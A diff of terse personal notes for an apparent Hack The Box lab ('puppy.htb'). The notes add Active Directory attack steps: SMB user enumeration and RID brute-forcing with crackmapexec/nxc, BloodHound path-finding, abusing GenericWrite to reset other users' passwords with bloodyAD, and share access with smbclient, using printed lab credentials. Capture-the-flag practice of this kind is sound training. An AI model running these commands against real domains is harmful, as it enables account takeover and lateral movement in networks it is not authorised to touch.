@@ -34,7 +34,17 @@ Then use bloodhund to find the connections and then use impacet tools.
 
 
 ---------------------------------------------------------------------------------------------------------
-1. bloodyAD -u ant.edwards -p 'Antman2025!' -d puppy.htb --dc-ip 10.10.11.70 set password adam.silver 'abc@123'
+1. crackmapexec smb xx.xx.xx.xx -u levi.james -p 'KingofAkron2025!' --users                          (the creds are given)
+2. nxc smb PUPPY.HTB -u 'levi.james' -p 'KingofAkron2025!' --rid-brute | grep "SidTypeUser" | awk -F '\\' '{print
+$2}' | awk '{print $1}' > users.txt                                                      (just creates a .txt with all users)
+
+3. use bloodhound to see all the connections
+4. if your user has "GenericWrite" at someone else you can change his password
+5. crackmapexec smb xx.xx.xx.xx -u levi.james -p 'KingofAkron2025!' --shares
+6. smbclient \\\\xx.xx.xx.xx\\DEV -U "levi.james"
+7. try dir and get filename
+
+bloodyAD -u ant.edwards -p 'Antman2025!' -d puppy.htb --dc-ip <ip> set password adam.silver 'abc@123'
 
 save into modify.ldif
 
